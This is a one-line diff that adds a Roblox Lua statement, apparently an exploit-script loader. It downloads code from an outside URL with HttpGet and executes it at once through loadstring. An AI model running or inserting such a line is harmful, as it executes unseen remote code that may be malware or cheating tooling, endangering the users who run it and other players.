@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cathub.fr/load/62f13d191e90fae06ba29ee86272d1bf"))()
